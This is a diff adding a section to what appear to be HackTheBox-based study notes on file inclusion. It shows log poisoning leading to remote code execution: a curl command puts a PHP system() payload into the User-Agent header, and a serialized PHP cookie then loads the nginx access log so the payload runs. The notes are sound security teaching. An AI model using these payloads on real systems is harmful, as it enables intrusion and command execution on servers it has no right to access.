@@ -189,6 +189,33 @@ Note: Change the size to 34 for the particular string </p>
 ![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Log%20Poisoning.webp)
 
 
+### Remote Code Execution
+
+As the User-Agent header is being logged, we are going to change its value to a malicious PHP code and send it to the server.
+
+RCE vulnerability allows an attacker to execute commands remotely on the victim system.
+
+Below PHP function system() accepts a command as a parameter and displays its result as output.
+
+```` <?php system('ls /'); ?> ````
+
+![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Log%20Poisoning_RCE.webp)
+
+````
+Command: curl -i -v {URL} -A "<?php system('ls /'); ?>"
+-i include response
+-v verbose 
+-A To provide the value of User-Agent
+
+````
+After the request is sent, the PHP code has been logged into the system and should be executed once we visit the access.log file.
+
+
+
+```` Command:  curl -i -v {URL} -b "PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==" ````
+
+![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Log%20Poisoning_RCE_.webp)
+
 https://academy.hackthebox.com/module/23/section/1492
 https://academy.hackthebox.com/module/23/section/1491
 https://www.google.com/search?q=javascript+lfi+vulnerability+code&sca_esv=125395e02bc1fefe&sca_upv=1&rlz=1C1VDKB_enIN1066IN1066&sxsrf=ACQVn09LDgIbAe0fetF7wuSZW9ELXgwbVQ%3A1713508799071&ei=vxEiZsHyA__hseMPmZq_wAc&ved=0ahUKEwiBzqba1c2FAxX_cGwGHRnND3gQ4dUDCBE&oq=javascript+lfi+vulnerability+code&gs_lp=Egxnd3Mtd2l6LXNlcnAiIWphdmFzY3JpcHQgbGZpIHZ1bG5lcmFiaWxpdHkgY29kZTIIEAAYgAQYogQyCBAAGIAEGKIEMggQABiABBiiBEjnCVAAWABwAHgBkAEAmAGIAaABiAGqAQMwLjG4AQzIAQD4AQL4AQGYAgGgAowBmAMAkgcDMC4xoAefAg&sclient=gws-wiz-serp
